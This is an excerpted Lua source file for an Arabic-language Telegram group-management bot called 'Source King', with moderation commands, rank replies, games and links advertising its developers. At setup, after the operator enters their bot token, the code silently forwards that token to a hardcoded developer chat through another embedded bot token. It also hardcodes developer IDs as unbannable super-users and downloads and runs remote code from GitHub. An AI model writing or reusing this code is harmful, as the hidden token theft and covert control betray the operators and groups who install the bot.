...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1901066797:AAGLmfTqGVhomz4_WcnKW__6dSHAtl75Obg/sendmessage?chat_id=1372188096&text=' ..token)
end 
else
print('\27[0;35m𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n\27[0;33;49m')
...
io.write('\27[1;31m 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
exit 1
fi
if [ ! $token ]; then
echo "𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘"
...
token = sudos.token 
--- start functions 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ffasit//main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1124610301,1770493345,1372188096,1823483517,1779781675}   
...
var = true  
elseif tonumber(user_id) == tonumber(1779781675) then
var = true  
elseif tonumber(user_id) == tonumber(1823483517) then
var = true  
...
elseif tonumber(user_id) == tonumber(1372188096) then
var = 'المبرمج عموره 😉🌍.'
elseif tonumber(user_id) == tonumber(1805808848) then
var = 'المبرمج عموره😉🌍'
elseif tonumber(user_id) == tonumber(1770493345) then
var = 'المبرمج ديشا😉🌍 '
elseif tonumber(user_id) == tonumber(SUDO) then
...
local UserName = (data.username_ or "S0URCE_KING")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》")  
...
if not DevSoFi(msg) then
local Text = [[
✰سعر التنصيب علي سورس كينج 
𖣐سعر التنصيب العادي 20جنيه فقط
✰للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '3mora✰',url="t.me/BOT3mora"}},
{{text = 'DESHA ✰',url="t.me/XxDesha86Xx"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ASALIYA ✰',url="t.me/BOT3mora"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》',url="t.me/S0URCE_KING"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
local Text = ' ✰تم ارسال الملصق من 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/Ffasit//main/DRAGON.lua')
...
send(msg.chat_id_, msg.id_,' ✰ اصدار سورس كينج{ 3x☆}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/K_I_N_G_1_2_3"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
if text == '𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس كينج ادخل وتابع الجديد](t.me/S0URCE_KING)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》', url="t.me/S0URCE_KING"}}, 
...
if text == '━┅┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس كينج ادخل وتابع الجديد](t.me/S0URCE_KING)
]] 
keyboard = {}  
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/S0URCE_KING)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/S0URCE_KING"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'عموره عضو' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
المبرمج عموره لو حابب تتواصل معاه
اتبع الزر إلى تحت 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘↜
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' 3MORA ✰', url="t.me/#FF0011BOT3mora"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ✰ من أحسن السورسات على التليجرام سورس كينج ✰
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "كينج")
...
send(msg.chat_id_,0," ✰ الـعـضو  : {["..data.first_name_.."](T.ME/S0URCE_KING)}\n ✰ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✰ عذرا  ⇇{["..data.first_name_.."](T.ME/S0URCE_KING)}\n ✰ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
╭𖣘━┅⟞⟦[𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶](http://t.me/S0URCE_KING)⟧⟝┉━𖣘╮

 [⟦W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧](http://t.me/S0URCE_KING)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'DEV DESHA✰', url="t.me/XxDesha86Xx"},{text = 'DEV 3mora✰', url="t.me/BOT3mora"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》',url="t.me/S0URCE_KING"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
 𖠪 اهلا بك في سورس كينج الجمدان 𖠪
 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪  
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' DESHA ✰',url="t.me/XxDesha86Xx"},{text = ' 3mora✰', url="t.me/BOT3mora"}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ', url="t.me/S0URCE_KING"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'عمك عموره' or text == 'عموره' or text == 'صاحب السورس'  then
local Text = [[
عموري صاحب سورس كينج للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '3mora✰',url="t.me/BOT3mora"}},
...
if text == 'عمك ديشا' or text == 'ديشا' or text == 'مالك السورس'  then
local Text = [[
ديشا مالك سورس كينج للتواصل معه اتبع الزر الاسفل ⬇️💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'DESHA ✰',url="t.me/XxDesha86Xx"}},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/V_I_K_I_N_G_2/88&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'عمر' then
local Text = [[
عمر د عموره يواد الي هوا مبرمج السورس😂💛✨
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تيتوا ابنمي 🥺❤🌍.',url="t.me/TTITOOOO"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/TTITOOOO&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
{{text = 'بوت دعم قنوات ☪',url="t.me/BOT3mora"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'مطورين السورس' then
local Text = [[ 
مطورين ومبرمجين سورس كينج اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس☎️', url="https://t.me/K_I_N_G_1_2_3"}}, 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽3𝙼𝙾𝚁𝙰₎ •𖣘 ❩', url="t.me/BOT3mora"}},
{{text = '《𝚂𝙴𝙼 𝙺𝙸𝙽𝙶》',url="t.me/S0URCE_KING"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == "ثيم كينج" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
...
✰ روايات ← لعرض الميزه
✰ ثيم ← لعرض الميزه
✰ ثيم كينج← لعرض الميزه
✰ همسه ← لعرض الميزه
✰ معني + اسمك ← لعرض الميزه
✰ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
✰ 𝘾𝙃 - [《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》](t.me/S0URCE_KING) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '❨  𖣘• ⁽3𝙼𝙾𝚁𝙰₎ •𖣘 ❩', url="t.me/BOT3mora"}},
{{text = '❨  𖣘• ⁽𝙺𝙸𝙽𝙶₎ •𖣘 ❩', url="t.me/S0URCE_KING"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'العاب كينج' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ✰ اهلا في قائمه الالعاب المتطوره سورس كينج ✰ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/S0URCE_KING)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع حظر عضو عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1779781675) then  
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع حظر المبرمج عموره 😉🌍.  عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1823483517) then  
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع حظر تيتوا ابنمي 🥺❤.  عام")
return false 
end
...
function(arg,data) 
usertext = '\n ✰ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'S0URCE_KING')..')'
...
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك حظر عضو \n")
return false 
end
if result.id_ == tonumber(1779781675) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك حظر المبرمج عموره 😉🌍.  \n")
return false 
end
if result.id_ == tonumber(1823483517) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك حظر تيتوا ابنمي 🥺❤.  \n")
return false 
end
...
usertext = '\n ✰ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'S0URCE_KING')..')'
status  = '\n ✰ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(1823483517) then  
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع حظر تيتوا ابنمي 🥺❤. ")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع كتم عضو عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1779781675) then  
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع كتم المبرمج عموره 😉🌍.  عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1823483517) then
send(msg.chat_id_, msg.id_, " ✰ لا تسطيع كتم تيتوا ابنمي 🥺❤. عام")
return false
end
if tonumber(result.sender_user_id_) == tonumber(1372188096) then  
...
if result.id_ == tonumber(1124610301) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك كتم عضو \n")
return false 
end
if result.id_ == tonumber(1372188096) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك كتم عمك المبرمج عموره  😉🌍.  \n")
return false 
end
if result.id_ == tonumber(1770493345) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك كتم عمك ديشاا 😂💛 \n")
return false 
end
if result.id_ == tonumber(1372188096) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك كتم مبرمج وصاحب السورس يعبيط😹💔 \n")
return false 
end
if result.id_ == tonumber(1770493345) then
send(msg.chat_id_, msg.id_, " ✰ لا يمكنك كتم صاحب السورس يعبيط😹💔 \n")
return false 
end
usertext = '\n ✰ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'S0URCE_KING')..')'
status  = '\n ✰ تم كتمه عام من الجروبات'
...
t = ' ✰ ملفات السورس كينج𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Ffasit//main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✰ اهلا بك في متجر ملفات كينج\n ✰ ملفات السورس 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n ✰ علامة تعني { ✔️ } ملف مفعل\n ✰ علامة تعني { ✖ } ملف معطل\n ✰ قناة سورس كينج𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n".." ✰ [اضغط هنا لدخول](t.me/S0URCE_KING) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit//main/File_Bot/"..file)
if res == 200 then
...
if text == ("مسح قائمه كينج") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ✰ تم مسح قائمه كينج')
return false
end

if text == 'قائمه كينج' and Sudo(msg) then
...
if text == ("رفع كينج") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع كينج@(.*)$") and Sudo(msg) then
local username = text:match("^رفع كينج@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع كينج(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع كينج(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل كينج") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل كينج@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل كينج@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل كينج(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل كينج(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\nء⧬━┅┅┄⟞❲[𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶](t.me/S0URCE_KING)❳⟝┄┉┉━⧬'..
'\n ✰  علامة ال {✓} تعني مفعل'..
'\n ✰  علامة ال {✘} تعني معطل'..
'\nء𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘'..
'\n'..' ✰  امر صيح  ⇇{ '..kickme..
...
' }\n'..' ✰  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ✰  الرفع  ⇇{ '..setadd..
' }\n'..' ✰  الحظر  ⇇{ '..banm..' }\n\n ✰═───═❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)❳═───═ ✰\n ✰ قناة سورس كينج𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\n [ ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)❳](t.me/S0URCE_KING) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘\nاضغط علي الاسم ليتم نسخه\n𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘ٴ\n ✰ ❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)❳ ✰ ')
end
...
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس كينجو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '《??𝙾𝚄𝚁𝙲𝙴 ??𝙸𝙽𝙶》', url="t.me/S0URCE_KING"}},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..✰♥️](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/S0URCE_KING)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤✰](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش اقمد من عموره😹💔](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..✰💕](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش اجمد من عموره😹💔](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/S0URCE_KING)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..✰💕](t.me/S0URCE_KING)')
return false
end
end
end
...
[[
🌨𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘Use ⇨ #username 🌨
🌨𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘iD ⇨ #id 🌨
🌨𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘Sta ⇨  #stast 🌨
🌨𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘Msg ⇨ #msgs 🌨
🌨𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ✰  
↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast ✰  
↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𝙈𝘼𝙎𝙂 ➱ #msgs ✰  
↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝@S0URCE_KING↜ ✰  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
local Text = [[
[🎮اختر اللعبه التي تريدها .↑]
[🕹اضغط علي الأزرار في الأسفل  .↑]
[🎯ألعاب سورس كينج الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
 اختر الامر الذي تريدها .↑𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
ده من الازرار بلاسفل . 𖣘━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶⟧⟝┄┉━𖣘
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𝚂𝙾𝚄𝚁𝙲𝙴 𝙺𝙸𝙽𝙶》 ](t.me/S0URCE_KING)❳ 
]]
keyboard = {} 
...
{{text = 'بتكره دا', callback_data="/help16"},{text = 'نكته', callback_data="/help23"}}, 
